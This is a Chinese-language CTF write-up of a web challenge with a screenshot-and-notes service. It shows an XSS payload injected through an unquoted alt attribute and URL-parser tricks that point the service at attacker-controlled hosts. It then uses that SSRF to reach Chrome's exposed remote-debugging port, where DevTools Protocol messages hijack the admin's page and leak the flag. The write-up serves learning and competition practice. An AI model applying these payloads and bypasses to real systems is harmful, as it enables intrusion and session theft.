### References

- [@LiveOverflow, Video WP: can you hack this screenshot service??, 2021-08-19](https://www.youtube.com/watch?v=FCjMoPpOPYI)
- [@jamchamb, wshax3.html, 2021-10-31](https://gist.github.com/jamchamb/fb8e1974548b03b18ef77618ff799a57)

**Tag: XSS, URL Parse trick, Chrome Devtools Protocol**

1.XSS 比较好找到，app.py 中使用了 flask 的 `render_template` 函数来渲染模板，根据[文档](https://flask.palletsprojects.com/en/2.2.x/tutorial/templates/)中的描述：

> Flask uses the [Jinja](https://jinja.palletsprojects.com/templates/) template library to render templates.

尽管在 jinja 文档的 [HTML Escaping](https://jinja.palletsprojects.com/en/3.1.x/templates/#html-escaping) 部分提到 **Jinja default configuration is no automatic escaping;** 但是在 flask 文档中有提到是默认开启自动转义的：

> In Flask, Jinja is configured to *autoescape* any data that is rendered in HTML templates.

所以正常情况下 `<` `>` `&` `"` 等字符会被转义掉，不会造成 XSS，但在 note.html 中有一处如下模板：

```html
{% if note.data.startswith('data:image/') %}
<img src="{{ note.data }}" class="rounded-t-xl object-cover h-full w-full" alt={{ note.title }} />
```

当添加的 note 中含有图片时(即使用 screenshot 功能创建的 note)，`alt` 属性中会包含 title 的内容，这部分很明显是可控的，并且不像 `src` 属性那样使用双引号，所以可以注入新的属性例如 `onload` 造成 XSS：

```html
<html>
  <head>
    <title>x onload=alert(document.domain)</title>
  </head>
  <body>xss</body>
</html>
```

2.虽然上面口出狂言说很明显可控，但在 `add_note()` 函数中也很明显告诉你只有当链接是以 `https://www.cscg.de` 或者 `http://cscg.de` 开头时才能进行 screenshot；当然这部分也也也很明显可以绕过的，例如如果你有域名的话，只需要设置子域名为 `cscg.de.` 即可：

```text
http://cscg.de.attacker.domain/xss.html
```

或者只要你读过 @Orange 的 [A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)，例如利用 authority 来绕过：

```text
http://cscg.de:test@attacker.ip/xss.html
```

这样前面的 `cscg.de` 和 `test` 就分别作为用于认证的 username 和 password (当然也可以不要 password 反正最后都是忽略的)，这样甚至不需要你拥有一个域名。

3.现在有了一个 XSS，根据 admin.py 中的逻辑，flagger 用户会把 flag 添加到 note 中，然后一段时间后再把该 note 删掉，如此循环。但这个 XSS 貌似是一个 Self-XSS，看起来没啥用；不过当我们绕过了域名检测时，这里其实就是一个 SSRF 了，所以可以尝试探测内网的一些东西。

然后再看代码，screenshot 功能和 admin.py 中的模拟用户功能都是通过 `pyppeteer` 来操作的

> pyppeteer is unofficial Python port of [puppeteer](https://github.com/GoogleChrome/puppeteer) JavaScript (headless) chrome/chromium browser automation library.

接下来是，摘抄 @Zedd 师傅语录环节😋：

> puppeteer 跟 chrome 联系是通过一个监听在本地 127.0.0.1 随机端口的 remote-debugging-port 通信的。可以通过 `chrome --remote-debugging-port=50000` 来启动这个 debug 端口。根据对应文档，我们可以通过 `http://127.0.0.1:50000/json` 来看到所有可以与之通信的目标。之后我们可以根据得到的 websocket 地址（`webSocketDebuggerUrl`），和对应的 TAB 建立 ws 链接

在 chrome 目录的 Dockerfile 中可以发现如下两行：

```dockerfile
ENTRYPOINT [
	... \
	"--remote-debugging-address=0.0.0.0", \
	"--remote-debugging-port=9222", \
	... \
]
```

可见开启了 debug 端口在 9222，事实上代码中也都有写，进行 screenshot 操作时就是连接到这个 debug 端口进行通信：

```python
await pyppeteer.connect(browserURL=f'http://{CHROME_IP}:9222')
```

并且在 `/activity` 路由下可以查看到这个 ip，因为通过日志来记录了：

```python
worker_name = base64.b64encode(CHROME_IP.encode('ascii')).decode('ascii').strip('=')
public_log(f"{g.user['username']} requested a screenshot via worker chrome:{worker_name}")
```

所以就可以通过：

```text
http://cscg.de@CHROME_IP:9222/json
```

来获取 flagger 用户进行 screenshot 操作时的 `webSocketDebuggerUrl`，然后进行一些操作来 leak flag（具体参考出题者的视频和脚本）

4.由于 flagger 用户跑完整个流程中有各种延时操作，再加上 screenshot 操作本身就要延迟 10s，所以为了当我们截图的时候能够获取到 flagger 用户在 debug 端口通信的 url，此时 flagger 用户的流程肯定也是在等待那个 10s 的阶段，再加上还要获取 `/devtools/page/` 后的 id、还要 ws 连接上去搞 XSS，作者在视频和脚本中直接化身时间管理大师，看的我是已经猪脑过载了。

然后翻了下评论区，看到个老哥的评论很有意思：

> As an alternative to the OCR + timing, you can use the Chrome DevTools protocol to create a separate page (+ browser context) that outlives the screenshot page, which avoids the need for timing. From that separate page, you can use the DevTools protocol to listen to new pages being created in the browser, and use the trick you mention in the video to redirect to a URL that triggers the XSS. 
>
> You might wonder how you connect to the API in the first place without needing to rely on one of the screenshot pages being alive (to avoid depending on the timing): it turns out you can connect to the "browser" rather than a "page" by using the WebSockets URL returned by **/json/version**, which is stable throughout the session.

确实妙啊，都能直接和 debug 端口通信了，还去管那个 flagger 用户的 websocket targets 干啥，直接连上 browser 的 `webSocketDebuggerUrl` 去监听那些事件，再来操作不就好了吗。

不过我并不懂 Chrome DevTools Protocol，简单搜了下这个思路，发现已经有人实现了（即参考链接2）。通过 [`/json/version`](https://chromedevtools.github.io/devtools-protocol/#endpoints) 获取到一个类似如下的 url：

```text
"webSocketDebuggerUrl": "ws://localhost:9222/devtools/browser/b0b8a4fb-bb17-4359-9533-a8d9f3908bd8"
```

<del>然后直接扔进脚本就打完了（bushi</del>

浅学了一下，首先是连接上 ws 后触发 `onOpen` 事件然后设置了一个 [Target.setDiscoverTargets](https://chromedevtools.github.io/devtools-protocol/tot/Target/#method-setDiscoverTargets) 用来监听一些事件：

```json
{"id":1,"method":"Target.setDiscoverTargets","params":{"discover":true}}
```

大概在控制台试了一下，flagger 完成一个完整流程，`onMessage` 监听返回了如下的 6 个事件：

```text
// context.newPage() 触发该事件
{"method":"Target.targetCreated","params":{"targetInfo":{"targetId":"6FFBA74471A90C9E3B05021B5CBD63DF","type":"page","title":"","url":"","attached":false,"canAccessOpener":false,"browserContextId":"02050974D9DD71E29E632659A7B82317"}}}

{"method":"Target.targetInfoChanged","params":{"targetInfo":{"targetId":"6FFBA74471A90C9E3B05021B5CBD63DF","type":"page","title":"about:blank","url":"about:blank","attached":false,"canAccessOpener":false,"browserContextId":"02050974D9DD71E29E632659A7B82317"}}}

{"method":"Target.targetInfoChanged","params":{"targetInfo":{"targetId":"6FFBA74471A90C9E3B05021B5CBD63DF","type":"page","title":"about:blank","url":"about:blank","attached":true,"canAccessOpener":false,"browserContextId":"02050974D9DD71E29E632659A7B82317"}}}

{"method":"Target.targetInfoChanged","params":{"targetInfo":{"targetId":"6FFBA74471A90C9E3B05021B5CBD63DF","type":"page","title":"https://www.cscg.de","url":"https://www.cscg.de/","attached":true,"canAccessOpener":false,"browserContextId":"02050974D9DD71E29E632659A7B82317"}}}

// 后面两个会延时一段时间(大概有个10几秒)才触发

{"method":"Target.targetInfoChanged","params":{"targetInfo":{"targetId":"6FFBA74471A90C9E3B05021B5CBD63DF","type":"page","title":"Cyber Security Challenge Germany","url":"https://www.cscg.de/","attached":false,"canAccessOpener":false,"browserContextId":"02050974D9DD71E29E632659A7B82317"}}}

// 页面关闭时触发该事件
{"method":"Target.targetDestroyed","params":{"targetId":"6FFBA74471A90C9E3B05021B5CBD63DF"}}
```

并且根据判断，事件为 `Target.targetInfoChanged` 时调用 checkTarget 函数，然后根据其中的 url 值是否为 `https://www.cscg.de/` 来决定是否进行下一步，这里对应上面的第 4 个事件，大概是 flagger 用户在执行 screenshot 操作时的等待期间。

此时由于 `attached` 的值为 true，然后脚本就在这期间通过 [Target.attachToTarget](https://chromedevtools.github.io/devtools-protocol/tot/Target/#method-attachToTarget) attach 了这个 targetId 并返回了一个 SessionID（Unique identifier of attached debugging session.），`onMessage` 监听到该事件后去调用了 targetAttached 函数。

获取到 SessionID 后就通过 [Target.sendMessageToTarget](https://chromedevtools.github.io/devtools-protocol/tot/Target/#method-sendMessageToTarget) 来进行通信了，在 targetAttached 函数中包装了两个 message，首先是通过 [DOM.getDocument](https://chromedevtools.github.io/devtools-protocol/tot/DOM/#method-getDocument) 获取了 DOM 树的相关信息，内容如下：

```text
RESPONSE: {"method":"Target.receivedMessageFromTarget","params":{"sessionId":"72779782C5A7C8F023D8FF21D6B63F17","message":"{\"id\":1336,\"result\":{\"root\":{\"nodeId\":1,\"backendNodeId\":2,\"nodeType\":9,\"nodeName\":\"#document\",\"localName\":\"\",\"nodeValue\":\"\",\"childNodeCount\":2,\"children\":[{\"nodeId\":2,\"parentId\":1,\"backendNodeId\":33,\"nodeType\":10,\"nodeName\":\"html\",\"localName\":\"\",\"nodeValue\":\"\",\"publicId\":\"\",\"systemId\":\"\"},{\"nodeId\":3,\"parentId\":1,\"backendNodeId\":34,\"nodeType\":1,\"nodeName\":\"HTML\",\"localName\":\"html\",\"nodeValue\":\"\",\"childNodeCount\":2,\"children\":[{\"nodeId\":4,\"parentId\":3,\"backendNodeId\":35,\"nodeType\":1,\"nodeName\":\"HEAD\",\"localName\":\"head\",\"nodeValue\":\"\",\"childNodeCount\":26,\"attributes\":[]},{\"nodeId\":5,\"parentId\":3,\"backendNodeId\":36,\"nodeType\":1,\"nodeName\":\"BODY\",\"localName\":\"body\",\"nodeValue\":\"\",\"childNodeCount\":3,\"attributes\":[\"class\",\"colorscheme-light\"]}],\"attributes\":[\"lang\",\"de\"],\"frameId\":\"6FFBA74471A90C9E3B05021B5CBD63DF\"}],\"documentURL\":\"https://www.cscg.de/\",\"baseURL\":\"https://www.cscg.de/\",\"xmlVersion\":\"\",\"compatibilityMode\":\"NoQuirksMode\"}}}","targetId":"6FFBA74471A90C9E3B05021B5CBD63DF"}}
```

最后通过 [DOM.setOuterHTML](https://chromedevtools.github.io/devtools-protocol/tot/DOM/#method-setOuterHTML) 事件将 nodeId 为 1 的节点（即 `#document`）修改掉了，这里是将 `title` 标签修改为了前面提到的 XSS 部分的代码。

此时延时 10s 完毕，获取 `page.title()` 时就不是前面测试的那一个 Cyber Security Challenge Germany 值，而是我们修改之后的值了。这样就完成了利用，不需要我们去操控时间，只需要等待 flagger 用户操作，我们 attach 上去修改它的值即可：

![img1](./assets/img1.png?raw=true)

虽然前面评论说不用管时间，不过感觉有时候可以触发有时候又不能触发，所以还是抄了下代码让他在 flagger 用户执行 screenshot 之前进行，这样感觉成功率高点。或者也可以暴力点尝试发一堆过去总有会触发的（
